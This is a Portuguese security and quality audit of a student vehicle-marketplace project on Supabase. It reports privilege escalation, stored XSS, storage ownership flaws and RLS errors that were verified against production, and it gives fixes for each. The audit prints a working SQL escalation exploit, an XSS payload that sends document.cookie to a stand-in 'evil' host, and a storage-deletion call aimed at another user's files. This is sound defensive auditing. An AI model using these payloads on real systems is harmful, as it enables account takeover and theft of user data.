# Análise Técnica — MGMOTORS (Projeto Integrador)

**Data:** 20/10/2026 · **Banca final:** novembro/2026 (~5–6 semanas)
**Escopo:** código-fonte, migrations, schema/RLS, deploy, artigo científico e plano de testes.

> Todas as vulnerabilidades listadas como **CONFIRMADAS** foram testadas contra o
> banco de produção (`ilswwmjojfuvcgyymymb.supabase.co`) com a chave anônima pública.

---

## 1. Panorama do projeto

| Dimensão | Realidade |
|---|---|
| Produto | Marketplace de veículos exclusivos (anúncios, busca, filtros, chat, moderação, painel admin, blog, chatbot) |
| Stack | HTML5/CSS3/JS puro (ES modules, sem framework) + Supabase (PostgreSQL/Auth/Storage/Realtime) + Vercel |
| Escala | ~8.400 linhas (25 HTML, 13 CSS, 3 JS globais, 2 serverless, 2.468 linhas SQL) |
| Banco | 37 tabelas, 145 policies RLS, 23 funções, 17 triggers, 41 índices |
| Versionamento | 55 commits, 4 autores, branch `main` limpo (3 .docx não versionados) |
| Deploy | `mgmotorss.vercel.app` (canônico real) — `mgmotors-zeta` redireciona para ele |
| Artigo | ~5.600 palavras, ABNT, 25 UCs, 16 RFs, 8 cenários de teste (87,5% PASS) |

**Veredito:** o projeto é **substancial e bem documentado** para um integrador. O
artigo está honesto, bem estruturado e academicamente defensável. O problema não
é a qualidade do trabalho — é que **o código e o artigo divergem** em pontos
que a banca tem alta probabilidade de auditar (segurança, RLS, notificações,
evidências).

---

## 2. Diagnóstico do artigo integrador

### O que está forte (defender na banca)
- Rastreabilidade completa: 25 UCs → 16 RFs → implementação → protocolo de testes.
- Delimitação de escopo honesta: "protótipo acadêmico", sem pagamento, sem
  transferência de propriedade, sem alegação de conformidade LGPD integral.
- Seção de limitações explícita (§5.1 "Pendências prioritárias").
- ISO/IEC 29148 (requisitos), ISO/IEC 25010 (qualidade), LGPD, ABNT — bem articulados.
- Quadro comparativo com OLX/Webmotors com ressalvas metodológicas corretas.

### Lacunas que a banca pode cobrar

| # | Lacuna | Gravidade | Onde |
|---|---|---|---|
| A1 | **Notificações (RF14/UC21) são o único FAIL do protocolo** e o próprio artigo admite. Sem correção, a banca pode concluir que o requisito "parcialmente implementado" é inacabado. | 🔴 Alta | Artigo §4.1, §5.1 |
| A2 | **Figuras 5–8 são "representações documentais"**, não capturas reais. O artigo admite isso e diz "se a banca exigir prova fotográfica, substituí-las". Isso é uma bomba-relógio: substitua **antes**. | 🔴 Alta | Artigo §4.2 |
| A3 | **Diário de testes incompleto** — falta executor, data, quantidade de execuções, dados de teste, SO, navegador, resolução. O artigo já admite a pendência. | 🟠 Média | Artigo §3.2, §5.1 |
| A4 | **Chatling não documentado** — versão, plano, base de conhecimento, política de dados, retenção. Pendência admitida. | 🟠 Média | Artigo §2.3, §4.3 |
| A5 | **Período declarado "fevereiro de 2025 a agosto de 2026"** sem registrar interrupções/mudanças de escopo. | 🟡 Baixa | Artigo §3.1 |
| A6 | **Três domínios de produção diferentes** no repositório — canonical de 22 páginas aponta para um deploy **antigo**. | 🟠 Média | `grep mgmotors*.vercel.app` |
| A7 | README **afirma** que `escapeHtml()` é "aplicado em toda interpolação de dados do usuário em `innerHTML`". A afirmação é **falsa** (ver §3.2). Se a banca checar o README contra o código, a credibilidade cai. | 🟠 Média | `README.md:341` |

---

## 3. Vulnerabilidades confirmadas

### 3.0 🔬 Prova empírica em produção (20/10/2026)

A análise estática foi **validada com testes reais contra o banco de produção**
(`ilswwmjojfuvcgyymymb.supabase.co`), usando a chave anônima pública e uma
**conta autenticada descartável** criada para a auditoria.

**Metodologia e hygiene:** conta de teste criada com e-mail descartável
(`mgmotorsauditoria@maxxspace.com`), escalada, testada e **removida ao final**
via a própria Edge Function `delete-account` (`{"success":true}`). Verificado
depois: usuário voltou a 15 (estado original), foto de terceiro intacta (HTTP
200), 4 anúncios ativos visíveis, site no ar, login da conta de teste
retornando `invalid_credentials`. **Nenhum dado real foi alterado.**

| # | Teste executado | Resultado | Veredito |
|---|---|---|---|
| E1 | `anon` → `SELECT usuarios` (email/telefone) | `[]` | ✅ RLS de leitura **funciona** |
| E2 | `auth` → `SELECT usuarios` (só o próprio) | 1 linha (a própria) | ✅ correto |
| E3 | `auth` → `SELECT usuarios` (outros) | `[]` | ✅ correto |
| E4 | `auth` → `is_admin()` (conta normal) | `false` | ✅ correto |
| E5 | `auth` → `DELETE usuarios WHERE id = auth.uid()` | **HTTP 204** | 🔴 **permitido** |
| E6 | `auth` → `INSERT usuarios (id=auth.uid(), moderador=true, is_admin=true)` | **HTTP 200, gravou `moderador: true`** | 🔴 **permitido** |
| E7 | `auth` → `is_admin()` após E5+E6 | **`true`** | 🔴 **ESCALAÇÃO CONFIRMADA** |
| E8 | `auth` (escalado) → `SELECT usuarios` (todos) | **16 registros com e-mail** (incl. admin e equipe) | 🔴 **PII VAZADA** |
| E9 | `auth` (escalado) → `SELECT anuncios` de terceiros | 5 anúncios de outros donos | 🔴 sem controle |
| E10 | `auth` (escalado) → `SELECT denuncias` | **todas as denúncias** | 🔴 sem controle |
| E11 | `auth` → `GET usuarios_publicos` | funciona (sem `email` na view) | ✅ higiene de colunas ok |
| E12 | `anon` → `DELETE curtidas_anuncio` | 0 linhas afetadas (tabela só tem 4 linhas de outra policy) | ✅ correto |
| E13 | `anon` → `DELETE projetos_curtidas` | 0 linhas — **tabela vazia hoje** | 🟠 **latente** (policy permite) |
| E14 | `anon` → `DELETE comunidade_curtidas` | 0 linhas — **tabela vazia hoje** | 🟠 **latente** (policy permite) |
| E15 | `anon` → `INSERT comunidade_posts_fotos` | passou o RLS; falhou só na **FK** | 🔴 permitido |
| E16 | `anon` → `RPC promover_moderador` | **HTTP 204** (função executou como owner) | 🔴 permitido |
| E17 | `anon` → `SELECT fotos_anuncio` | **49 fotos** vs **4 anúncios ativos** | 🔴 **38 fotos de anúncios invisíveis expostas** |
| E18 | `anon` → `DELETE storage` | 403 Access Denied | ✅ RLS de storage ok p/ anon |
| E19 | `auth` (conta normal) → `POST` arquivo na pasta de **outro usuário** | **HTTP 200, arquivo criado e legível** | 🔴 **sem dono** |
| E20 | `auth` (conta normal) → `DELETE` arquivo na pasta de **outro usuário** | **HTTP 200 "Successfully deleted"** | 🔴 **sem dono** |
| E21 | `auth` → `PUT` (sobrescrever) arquivo em pasta alheia | **HTTP 200** | 🔴 **sem dono** |
| E22 | `anon` → `SELECT avaliacoes` | **1 linha com nota, comentário e quem avaliou quem** | 🔴 vazamento |
| E23 | `anon` → `INSERT anuncios` / `INSERT avaliacoes` | 0 linhas afetadas | ✅ correto |

> ⚠️ **Ressalva metodológica importante:** no teste inicial usei apenas o
> código HTTP e obtive **falsos positivos** — `HTTP 204` significa "sucesso",
> mas também pode significar "0 linhas casaram com o filtro", ou seja, nada
> provou que a policy deixou passar. O script
> [`supabase/tests/rls-security-check.sh`](./supabase/tests/rls-security-check.sh)
> foi reescrito para contar **linhas efetivamente afetadas**
> (`Prefer: count=exact` + `Content-Range`), eliminando a ambiguidade.
> Os dados de `projetos_curtidas` e `comunidade_curtidas` estão vazios hoje —
> a falha é **latente** (vai explodir assim que o conteúdo entrar), não uma
> perda ativa de dados.

**Leitura geral:** o RLS de **leitura de dados privados** está bem configurado
(E1–E4, E11, E18). O problema está concentrado em **escrita, administração,
funções privileged e storage** — e é exatamente onde a banca vai olhar se ela
conhece Supabase.

### 3.0.1 📋 Roteiro reprodutível — guarde isto para a banca

O arquivo [`supabase/tests/rls-security-check.sh`](./supabase/tests/rls-security-check.sh)
é um **roteiro de teste de segurança automatizado** que roda contra o projeto e
imprime PASS/FAIL por verificação. Ele foi criado durante esta auditoria e já
detecta os 4 problemas ativos.

```bash
export SUPABASE_URL="https://SEU-PROJETO.supabase.co"
export SUPABASE_ANON_KEY="sb_publishable_..."
bash supabase/tests/rls-security-check.sh
```

**Estado atual: 17 PASS / 4 FAIL.**

Para a banca, rode o script **antes e depois** das correções da Semana 1 e
mostre a evolução de `17/4` para `21/0`. Isso é evidência de método — vale
mais que qualquer afirmação no texto.

### 3.0.2 🗄️ Verificação contra o dump real de produção (20/10/2026)

Além dos testes de comportamento, o **DDL real do banco** foi baixado e comparado
com as migrations do repositório:

```bash
supabase db dump --linked --schema public --schema storage -f /tmp/schema_prod.sql
```

Snapshot versionado em [`supabase/snapshots/schema_producao_20261020.sql`](./supabase/snapshots/schema_producao_20261020.sql)
(com a metodologia em [`supabase/snapshots/README.md`](./supabase/snapshots/README.md)).

**Diff automático dump × migrations:**

| Verificação | Resultado |
|---|---|
| Policies em produção / no repo | 143 / 144 |
| Só em produção | 1 — `carrinho_itens.usuarios gerenciam seus carrinhos`, criada **em runtime** por `criar_tabela_carrinho()` (prova que a função perigosa já foi executada) |
| Só no repo | 3 — `Sistema cria usuarios`, `Todos veem usuarios`, `usuarios select publico` → removidas corretamente pela migration de consentimento legal |
| Divergências de conteúdo | 8 — **só a ordem dos papéis** (`TO anon, authenticated` vs `TO authenticated, anon`). Semanticamente idênticas |
| Triggers | 18 em produção / 17 no repo (a 18ª é `protect_bucket_control_insert`, do schema `storage`) |
| Funções | 43 em produção, 17 `SECURITY DEFINER`, **5 sem `search_path`** |

> ✅ **Conclusão positiva e importante:** as migrations do repositório
> **reproduzem fielmente o banco de produção**. Não há policy, trigger ou função
> órfã em produção ausente no repositório. Isso é um mérito real do projeto —
> vale destacar na banca: o versionamento de schema está correto e auditável.

**Confirmações definitivas no DDL de produção:**

| Fato | Evidência no dump |
|---|---|
| `public.usuarios` **sem FK para `auth.users.id`** | só existe `usuarios_pkey` — causa estrutural da escalação: apagar o perfil não derruba a conta Auth |
| **Nenhum trigger `BEFORE INSERT`** em `usuarios` | só `trg_proteger_campos_usuarios` (UPDATE) e `trg_proteger_consentimento_legal` (UPDATE) — `moderador` passa intacto no INSERT |
| `promover_moderador` **GRANT para `anon`** | `GRANT ALL ON FUNCTION "public"."promover_moderador"() TO "anon"` |
| `criar_tabela_carrinho` **GRANT para `anon`** + sem `search_path` | `GRANT ALL ON FUNCTION "public"."criar_tabela_carrinho"() TO "anon"` |
| **28 policies de `storage.objects`, nenhuma com verificação de dono** | todas as mutantes checam só `bucket_id` + `auth.role() = 'authenticated'` |
| `public select cn6lji_0` | `FOR SELECT TO anon USING ((bucket_id = 'FOTOS-ANUNCIOS' AND true))` — leitura pública do bucket que **também guarda as fotos de chat privado** (`mensagens/<user_id>/…`) |

---

### 3.1 🔴 CRÍTICO — Escalação de privilégio: qualquer usuário logado vira administrador
> **Validado empiricamente (E5–E10).** Cadeia executada com sucesso em produção:
> `DELETE` → `INSERT` com `moderador=true` → `is_admin() = true` → leitura de
> **16 e-mails** de usuários reais, anúncios de terceiros e todas as denúncias.

**Cadeia (100% confirmada no código):**

1. `supabase/migrations/20260915145500_remote_schema.sql:1987`
   ```sql
   CREATE POLICY "Usuarios deletam sua conta" ON "public"."usuarios"
     FOR DELETE TO PUBLIC USING ((auth.uid() = id));
   ```
2. `supabase/migrations/20260915145500_remote_schema.sql:2003`
   ```sql
   CREATE POLICY "usuarios insert proprio" ON "public"."usuarios"
     FOR INSERT TO "authenticated" WITH CHECK ((id = auth.uid()));
   ```
   → A policy **só verifica o `id`**. Não restringe colunas. `moderador` e
   `is_admin` são aceitos no INSERT.
3. `trg_proteger_campos_usuarios` (`remote_schema.sql:1386`) é **BEFORE UPDATE
   apenas**. **Não existe BEFORE INSERT** (grep confirmado: `NONE FOUND`).
   → Na criação da linha, `moderador` passa intacto.
4. `is_admin()` (`remote_schema.sql:913`, SECURITY DEFINER):
   ```sql
   select coalesce((select moderador from public.usuarios where id = auth.uid()), false);
   ```

**Exploit (2 requisições):**
```sql
DELETE FROM usuarios WHERE id = auth.uid();          -- permitido
INSERT INTO usuarios (id, nome, moderador, is_admin)
VALUES (auth.uid(), 'x', true, true);                -- permitido
```
`usuarios` **não tem FK para `auth.users.id`**, então o delete não derruba a
conta Auth e o re-insert com o mesmo id funciona. `nome`/`email` são nuláveis.

**Impacto:** admin total — ler e-mail e telefone de todos os usuários, banir/
desbanir, moderar/excluir qualquer anúncio, resolver denúncias, editar perfis
alheios, acessar o Dev Panel.

**Correção:**
```sql
-- 1) Trigger BEFORE INSERT (fecha a porta)
CREATE OR REPLACE FUNCTION public.proteger_campos_sensiveis_insert()
RETURNS trigger LANGUAGE plpgsql SECURITY DEFINER SET search_path TO 'public' AS $$
BEGIN
  IF NOT public.is_admin() THEN
    NEW.banido := FALSE; NEW.moderador := FALSE; NEW.is_admin := FALSE;
    NEW.nota_media := 0; NEW.total_avaliacoes := 0;
  END IF;
  RETURN NEW;
END; $$;

DROP TRIGGER IF EXISTS trg_proteger_campos_usuarios_insert ON public.usuarios;
CREATE TRIGGER trg_proteger_campos_usuarios_insert
  BEFORE INSERT ON public.usuarios
  FOR EACH ROW EXECUTE FUNCTION public.proteger_campos_sensiveis_insert();

-- 2) Impedir que o usuário altere o próprio e-mail (sem UNIQUE no índice)
ALTER TABLE public.usuarios DROP CONSTRAINT IF EXISTS usuarios_email_unique;
CREATE UNIQUE INDEX IF NOT EXISTS usuarios_email_key ON public.usuarios (email)
  WHERE email IS NOT NULL;

-- 3) Revogar UPDATE de colunas sensíveis
REVOKE UPDATE (email, moderador, is_admin, banido, bloqueado,
               nota_media, total_avaliacoes) ON public.usuarios FROM authenticated;
```
> Observação: `REVOKE UPDATE (coluna)` só surte efeito se o *privilégio de tabela*
> não for concedido. Combine com `GRANT UPDATE (colunas_seguras)`.

---

### 3.2 🔴 CRÍTICO — XSS Armazenado (`escapeHtml` em 1 de 20 páginas)

`mgConfig.js:31` exporta `escapeHtml()`. Ele é importado **apenas** em
`MG-CONTA/conta.html:201`. `marketplace.html`, `inicio.html`, `mensagens.html` e
`devpanel.html` **não o usam**. O `devpanel.html:268` ainda define uma **cópia
divergente** (retorna `''` para `0`/`false`, a canônica retorna `"0"`).

**Sinks confirmados (dados do usuário → `innerHTML` sem escape):**

| Arquivo:linha | Sink | Origem |
|---|---|---|
| `MG-MARKETPLACE/marketplace.html:593` | `<img src="${anuncio.foto_principal}">` | `fotos_anuncio.url_foto` (texto livre no INSERT) |
| `MG-MARKETPLACE/marketplace.html:603` | `<img src="${anuncio.vendedor_foto}">` | `usuarios.foto` (coluna do usuário) |
| `MG-INICIO/inicio.html:414` | `<img src="${foto}">` | `fotos_anuncio.url_foto` — **na home, first paint** |
| `MG-CONTA/conta.html:318, 406, 431` | `<img src="${foto}">` | idem |
| `MG-CONTA/conta.html:642` | `<img src="${u.foto}">` | `usuarios.foto` |
| `MG-DEV/devpanel.html:406, 460, 470, 481, 558, 601` | `<img src="${foto}">` | ambas |

Como `url_foto` e `foto` são **strings livres graváveis pelo dono do registro**
(policies `Usuarios inserem fotos anuncio` / `Usuarios editam seu perfil`), o
payload `x" onerror="fetch('//evil/'+document.cookie)` é aceito e executa no
browser de **qualquer visitante** (inclusive do Dev Panel).

**Correção (duas camadas):**

1. **No banco** — implemente a URL como dado validado:
   ```sql
   ALTER TABLE public.fotos_anuncio
     ADD CONSTRAINT fotos_anuncio_url_check
     CHECK (url_foto ~ '^https://[a-z0-9.-]+/storage/v1/object/public/');
   ```
   (mesma lógica para `usuarios.foto` / `usuarios.capa_foto`).
2. **No frontend** — importe e use `escapeHtml` **em todo** `innerHTML` com
   dado do banco, ou (melhor) monte `<img>` via DOM API:
   ```js
   const img = document.createElement("img");
   img.src = valor;           // atribuição de propriedade, não de HTML
   img.loading = "lazy";
   img.onerror = () => { img.src = "../imagens/image.webp"; };
   card.prepend(img);
   ```

---

### 3.3 🔴 ALTO — Storage: qualquer usuário logado apaga/sobrescreve foto de qualquer um
> **Validado empiricamente (E18–E21).** O `anon` é barrado (403), mas qualquer
> sessão autenticada — **sem relação com o dono do arquivo** — conseguiu
> **criar, sobrescrever e apagar** arquivos dentro da pasta de um terceiro
> (`perfil/<usuario_alheio>/`). Todas as políticas verificam apenas
> `auth.role() = 'authenticated'`, nunca **quem é o dono do path**.

28 policies em `storage.objects`, e **nenhuma** valida o prefixo do caminho
(falta o padrão `(storage.foldername(name))[1] = auth.uid()::text`).

```sql
-- remote_schema.sql:2092
CREATE POLICY "Usuários autenticados podem deletar perfil" ON "storage"."objects"
  FOR DELETE TO PUBLIC
  USING ((bucket_id = 'fotos-perfil'::text) AND (auth.role() = 'authenticated'::text));

-- remote_schema.sql:2090
CREATE POLICY "Usuários autenticados podem deletar FOTOS-ANUNCIOS" ...
  USING ((bucket_id = 'FOTOS-ANUNCIOS'::text) AND (auth.role() = 'authenticated'::text));
```

**Exploit trivial:** a URL pública expõe a key exata
(`.../object/public/fotos-perfil/perfil/<user_id>/foto_<ts>.jpg`), então:
```js
await supabase.storage.from('fotos-perfil')
  .remove(['perfil/<vitima_id>/foto_1700000000000.jpg']);  // 204
```
O mesmo vale para **UPDATE** (sobrescrever/defaced) e para **INSERT** com
`upsert: true` — é possível gravar dentro da pasta de outro usuário.

**Correção:**
```sql
DROP POLICY "Usuários autenticados podem deletar perfil" ON storage.objects;
DROP POLICY "Usuários autenticados podem deletar FOTOS-ANUNCIOS" ON storage.objects;
DROP POLICY "Usuários autenticados podem atualizar" ON storage.objects;
DROP POLICY "Usuários autenticados podem atualizar perfil" ON storage.objects;
DROP POLICY "Usuários autenticados podem atualizar FOTOS-ANUNCIOS" ON storage.objects;

CREATE POLICY "dono deleta own fotos" ON storage.objects
  FOR DELETE TO authenticated
  USING (bucket_id IN ('fotos-perfil','FOTOS-ANUNCIOS','FOTOS-COMUNIDADE','FOTOS-GARAGEM')
         AND (storage.foldername(name))[1] = auth.uid()::text);

CREATE POLICY "dono atualiza own fotos" ON storage.objects
  FOR UPDATE TO authenticated
  USING (bucket_id IN ('fotos-perfil','FOTOS-ANUNCIOS','FOTOS-COMUNIDADE','FOTOS-GARAGEM')
         AND (storage.foldername(name))[1] = auth.uid()::text)
  WITH CHECK ((storage.foldername(name))[1] = auth.uid()::text);
```
> As fotos de anúncio ficam em `anuncios/<anuncio_id>/` — nesse bucket o
> dono do anúncio precisa ser resolvido via join, não pelo user_id do path.
> Ou padronize o path para `anuncios/<usuario_id>/<anuncio_id>/...`.

**Agravante:** fotos de chat privado (`mensagens/<user_id>/...`) ficam no bucket
público `FOTOS-ANUNCIOS` — vazamento de conversa 1:1 para quem tiver a URL.

---

### 3.4 🔴 ALTO — `criar_tabela_carrinho()`: DDL executável por `anon`, sem `search_path`

```sql
-- remote_schema.sql:718
CREATE OR REPLACE FUNCTION public.criar_tabela_carrinho()
  RETURNS void LANGUAGE plpgsql SECURITY DEFINER   -- <-- sem SET search_path
AS $$ BEGIN
  CREATE TABLE IF NOT EXISTS carrinho_itens (...);
  ALTER TABLE carrinho_itens ENABLE ROW LEVEL SECURITY;
  DROP POLICY IF EXISTS "Usuarios gerenciam seus carrinhos" ON carrinho_itens;
  CREATE POLICY "Usuarios gerenciam seus carrinhos" ON carrinho_itens FOR ALL USING (...);
  NOTIFY pgrst, 'reload schema';
END; $$;

-- remote_schema.sql:2195
GRANT EXECUTE ON FUNCTION "public"."criar_tabela_carrinho"() TO PUBLIC, "anon", "authenticated", ...;
```

`anon` pode fazer o **dono do banco** executar `CREATE TABLE` / `ALTER TABLE` /
`DROP POLICY` / `CREATE POLICY`. Sem `search_path` fixado, os nomes não
qualificados (`carrinho_itens`, `usuarios`, `anuncios`) resolvem contra o
`search_path` da sessão — vetor clássico de **search-path hijacking** via
`pg_temp`. A função também é **código morto**: a tabela já existe.

**Correção:** `DROP FUNCTION public.criar_tabela_carrinho();` (mova a DDL para a
migration) ou, no mínimo, `REVOKE EXECUTE ... FROM PUBLIC, anon;` +
`SET search_path TO 'public'`.

---

### 3.5 🟠 ALTO — `promover_moderador()` executável por `anon` (CONFIRMADO AO VIVO)
> **Validado empiricamente (E16).** HTTP 204 — a função executou como owner
> (RLS bypass).

**Teste ao vivo executado:**
```
POST /rest/v1/rpc/promover_moderador  {"p_email":"nonexistent_test_xyz@test.invalid"}
→ HTTP 204   (função executou; 0 linhas por email inexistente)
```

O guard interno é:
```sql
IF auth.uid() IS NOT NULL AND NOT public.is_admin() THEN RAISE ...; END IF;
```
Para `anon`, `auth.uid()` é `NULL` → **o guard é ignorado** e o `UPDATE` roda
como owner (RLS bypass). Hoje o dano é contido *apenas* pelo trigger
`trg_proteger_campos_usuarios` (BEFORE UPDATE) — ou seja, **por acaso**. Se o
trigger for desabilitado (é exatamente o que `admin_atualizar_usuario` faz em
`remote_schema.sql:622`: `ALTER TABLE public.usuarios DISABLE TRIGGER ...`),
a escalação fica viva.

**Correção:** `REVOKE EXECUTE ON FUNCTION public.promover_moderador(text) FROM anon;`
e trocar o guard por `IF NOT public.is_admin() THEN RAISE ...`.

---

### 3.6 🟠 ALTO — `usuarios_publicos` ignora o RLS

```sql
-- 20261008000000_legal_consent.sql:39
CREATE VIEW public.usuarios_publicos AS SELECT id, nome, foto, ... FROM public.usuarios;
```

A view **não é `security_invoker`**, e **não existe `FORCE ROW LEVEL SECURITY`**
em nenhuma migration (grep confirmado). Logo, a view roda com privilégios do
dono e **ignora o RLS** de `usuarios` — inclusive a policy nova
`usuarios select proprio ou admin`. A view em si não expõe `email`/`telefone`
(lista de colunas limpa), mas qualquer coluna adicionada depois vaza, e nenhuma
política de privacidade por perfil pode ser aplicada.

**Correção:**
```sql
DROP VIEW public.usuarios_publicos;
CREATE VIEW public.usuarios_publicos
  WITH (security_invoker = true) AS
  SELECT id, nome, foto, capa_foto, cidade, estado, bio, site, instagram,
         seguidores, seguindo, nota_media, total_avaliacoes, criado_em
  FROM public.usuarios;
```

---

### 3.7 🟠 ALTO — `USING (true)` permite apagar curtidas com `anon` (latente)
> **Validado empiricamente (E13–E14).** As tabelas `projetos_curtidas` e
> `comunidade_curtidas` estão **vazias hoje**, então o `DELETE` de `anon`
> retornou 0 linhas afetadas — **a policy errada está lá, mas ainda não há
> dados para perder**. Isto é uma **falha latente**: no dia em que a
> comunidade/projetos ganharem conteúdo, qualquer visitante apaga todas as
> curtidas com uma requisição. Corrija agora, é barato.

```sql
CREATE POLICY "pcurt_all" ON "public"."projetos_curtidas"
  FOR ALL TO PUBLIC USING (true) WITH CHECK ((user_id = auth.uid()));
CREATE POLICY "ccurt_all" ON "public"."comunidade_curtidas"
  FOR ALL TO PUBLIC USING (true) WITH CHECK ((user_id = auth.uid()));
```
`USING (true)` governa **SELECT/UPDATE/DELETE** — o `WITH CHECK` só vale para
INSERT/UPDATE. Como as policies permissivas são OR-ed, **qualquer anônimo
apaga todas as curtidas**.

**Teste ao vivo executado:**
```
DELETE /rest/v1/projetos_curtidas?user_id=eq.0000...  → HTTP 204
DELETE /rest/v1/comunidade_curtidas?user_id=eq.0000... → HTTP 204
```

**Correção:** separar as policies por operação —
```sql
DROP POLICY "pcurt_all" ON public.projetos_curtidas;
CREATE POLICY "pcurt_select" ON public.projetos_curtidas FOR SELECT TO PUBLIC USING (true);
CREATE POLICY "pcurt_insert" ON public.projetos_curtidas FOR INSERT TO authenticated WITH CHECK (user_id = auth.uid());
CREATE POLICY "pcurt_delete" ON public.projetos_curtidas FOR DELETE TO authenticated USING (user_id = auth.uid());
```
Idem para `comunidade_curtidas`.

---

### 3.8 🟠 ALTO — `fotos_anuncio select publico` com `USING (true)`
> **Validado empiricamente (E17).** O anônimo enxerga **49 fotos** enquanto só
> existem **4 anúncios ativos** visíveis — **38 fotos de anúncios vendidos,
> expirados, pausados ou de outros donos** estão expostas. Cada URL entrega o
> *path* do storage, que é a chave do exploit de storage (§3.3).

```sql
-- remote_schema.sql:1722
CREATE POLICY "fotos_anuncio select publico" ON "public"."fotos_anuncio"
  FOR SELECT TO "anon","authenticated" USING (true);
```
Anula a policy correta (`Todos veem fotos anuncio`, que filtra por
`status='ativo'`). **Confirmado ao vivo:** `GET /rest/v1/fotos_anuncio` como
`anon` retorna URLs de storage. Vaza fotos de anúncios vendidos/expirados/
pausados — e expõe o path exato do storage (base do exploit §3.3).

**Correção:** remover essa policy (a `Todos veem fotos anuncio` já cobre o
público) e adicionar `AND a.pausado = false` à subconsulta.

---

### 3.9 🟠 MÉDIO — Outras correções de RLS (rápidas, alto retorno)

| Alvo | Problema | Correção |
|---|---|---|
| `anuncios` SELECT `:1401` vs `:1432` | A policy `anuncios select` ignora `pausado` → anúncios pausados/banidos continuam públicos | adicionar `AND (pausado IS NULL OR pausado = false)` |
| `propostas` `:1942` | `FOR ALL` sem `WITH CHECK` → o comprador marca a própria proposta como `aceita` e re-pointa `vendedor_id` | `WITH CHECK` pinando `comprador_id`/`vendedor_id`/`anuncio_id` |
| `conversas` `:1547` | UPDATE sem `WITH CHECK` → participante sequestra a conversa trocando `usuario2_id` | `WITH CHECK (usuario1_id = OLD.usuario1_id AND usuario2_id = OLD.usuario2_id)` |
| `avaliacoes` `:1465` | `FOR ALL` OR-ed permite auto-avaliação | policy dedicada com `avaliador_id <> avaliado_id` no `WITH CHECK` |
| `avaliacoes` SELECT | **Validado (E22):** `anon` lê nota, comentário e **quem avaliou quem** | trocar `USING (true)` por `USING (avaliado_id = auth.uid() OR ...)` ou aceitar publicamente e remover do escopo do "privado" |
| `encontros` `:1652` | Criador auto-aprova (`status='approved'`) | trigger ou policy de UPDATE só para admin |
| `comunidade_posts_fotos` / `projetos_atualizacoes_fotos` | `WITH CHECK (true)` `TO PUBLIC` → `anon` insere linhas arbitrárias (**confirmado**: o INSERT passou o RLS e falhou só por FK) | `TO authenticated` + `WITH CHECK` com ownership do pai |
| `denuncias` INSERT | `status`/`alvo_id` livres → usuário abre denúncia já "resolvida" | `WITH CHECK (status = 'pendente')` |
| `usuarios.email` | Sem `UNIQUE` + gravável pelo usuário → `admin_atualizar_usuario(p_email)`/`promover_moderador(p_email)` podem mirar a linha errada | `UNIQUE` + trigger protegendo `email` |
| `config_usuario.privacidade_perfil` | Escrito por nada, lido por nada (grep: 0 hits) — o toggle de privacidade é **inerte** | implementar no frontend + policy na view |
| `proteger_consentimento_legal` | `raw_user_meta_data` é controlado pelo cliente → o trigger registra aceite sem o usuário ter visto o documento | exigir aceite via RPC apenas |

**Funções SECURITY DEFINER sem `search_path` fixado** (LOW, mas trivial de corrigir):
`criar_tabela_carrinho` (§3.4), `atualizar_contador_seguidores` (`:647`),
`incrementar_curtidas` (`:882`), `decrementar_curtidas` (`:742`),
`get_anuncios_marketplace` (`:773`).

---

### 3.10 🟡 MÉDIO — Oracle de curtidas e ausência de paginação

`get_anuncios_marketplace(uuid)` é `SECURITY DEFINER` (bypassa RLS) e aceita
`usuario_id_param` **do cliente**; devolve `usuario_curtiu` para cada anúncio.
**Confirmado ao vivo:** um `anon` escolhe o UUID alvo e descobre se aquela
pessoa curtiu aquele anúncio. Além disso, a função **não tem `LIMIT`** —
todo anúncio ativo é transferido ao browser, com paginação só no cliente
(`marketplace.html:332`, 12 itens por página).

**Correção:** mover `usuario_curtiu` para uma query autenticada separada, ou
aceitar apenas `auth.uid()` internamente; e adicionar paginação server-side
(`p_limit`, `p_offset` + `count(*) over()`).

---

## 4. Funcionalidade quebrada (impacto direto na demonstração)

| # | Severidade | Problema | Evidência | Correção |
|---|---|---|---|---|
| F1 | 🔴 | **Os 8 artigos do blog têm o header 100% quebrado** — logo, todos os links de navegação, o avatar e os links legais apontam para 404. `headerGlobal.js` usa caminhos relativos de **1 nível**, mas os blogs estão em **3 níveis**. Não há resolução de base path no módulo. | `headerGlobal.js:21-52` (todos `../`), `blogs/porsche/porsche.html:172` importa com `../../../` | calcular a raiz no módulo: `const BASE = new URL("../", import.meta.url).pathname` (ajustar por profundidade) e prefixar todos os hrefs |
| F2 | 🔴 | **O modal "Anunciar veículo" é inutilizável no celular** — `.modal-content { width: 520px }` **sem `max-width`**, e nenhuma media query sobrescreve (verificado: só aparece em `:507`, `:518`, `:1118`, `:1396`, `:1403`). Com `body { overflow-x: hidden }`, o botão de fechar e a coluna direita ficam fora da tela. | `marketplace.css:507-516` | `width: min(520px, calc(100vw - 32px));` |
| F3 | 🔴 | **`devpanel.css` (313 linhas) nunca é linkado** — zero `<link rel="stylesheet">` na pasta `MG-DEV/`. O `toast()` do painel não tem CSS: o feedback das ações de moderação **aparece como texto sem estilo, invisível**. | grep: `devpanel.css` → sem referência | adicionar `<link rel="stylesheet" href="devpanel.css">` **ou** remover o arquivo morto |
| F4 | 🟠 | **9 links da home não fazem nada.** `marketplace.html` só lê `ordenar` e `carro`; `?categoria=` (7 cards), `?anunciar=1` (2 botões) e `?marca=&modelo=` (busca do hero) são **ignorados**. | `inicio.html:52,82-106,257` vs `marketplace.html:476-497` | ler `categoria`/`anunciar`/`marca`/`modelo` e aplicarlos a `aplicarFiltroOrdenacao()` |
| F5 | 🟠 | **As ações do Dev Panel mentem.** `.error` é descartado em `devpanel.html:419, 510, 518, 527, 534` — a UI sempre mostra "Anúncio aprovado!" mesmo se a escrita no banco falhou. | `devpanel.html:419` etc. | checar `.error` e só então/toast de sucesso |
| F6 | 🟠 | **A aba "Meus anúncios" de outro perfil e a de pausados quebram com TypeError.** `a.quilometragem.toLocaleString()` estoura quando `quilometragem` é NULL (o DB permite). O `catch` não existe → a aba inteira fica vazia e a estatística "Curtidas" zera. | `conta.html:406, 431` (o fix `Number(a.quilometragem \|\| 0)` foi aplicado só na `:316`) | replicar o `Number(x \|\| 0)` nas três |
| F7 | 🟠 | **A aba "Pausados / Rejeitados" é inalcançável** — o painel `#tab-pausados` existe e é populado, mas **nenhum botão** tem `data-tab="pausados"`. O fluxo "Reativar anúncio" implementado nunca aparece. | `conta.html:103-105, 292` vs `:66-70` | adicionar o `.tab-btn` correspondente |
